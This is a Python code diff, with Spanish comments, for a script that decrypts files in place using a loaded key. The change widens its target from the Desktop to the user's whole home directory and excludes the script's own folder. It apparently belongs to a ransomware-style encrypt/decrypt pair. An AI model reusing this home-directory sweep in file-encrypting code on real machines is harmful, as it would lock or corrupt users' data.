@@ -32,18 +32,21 @@ def decrypt(item, key):
     with open(item, 'wb') as file:
         file.write(decrypted_data)
 
-# Obtiene todos los archivos en un directorio dado.
-def get_all_files_in_directory(dir_path):
+# Obtiene todos los archivos en un directorio dado, excepto los del directorio excluido.
+def get_all_files_in_directory(dir_path, exclude_path):
     files_list = []
     for root, dirs, files in os.walk(dir_path):
+        if root.startswith(exclude_path):
+            continue
         for file in files:
             files_list.append(os.path.join(root, file))
     return files_list
 
 # Si este script se ejecuta como el principal, desencripta todos los archivos en el directorio dado.
 if __name__ == '__main__':
-    path_to_encrypt = os.path.expanduser('~/Desktop')  # Ahora obtiene automáticamente el directorio del usuario
-    all_files = get_all_files_in_directory(path_to_encrypt)
+    path_to_encrypt = os.path.expanduser('~')  # Ahora obtiene automáticamente el directorio del usuario
+    exclude_path = os.path.dirname(os.path.abspath(__file__))  # Excluye el directorio del proyecto
+    all_files = get_all_files_in_directory(path_to_encrypt, exclude_path)
 
     key = cargar_key()
     with multiprocessing.Pool() as pool:
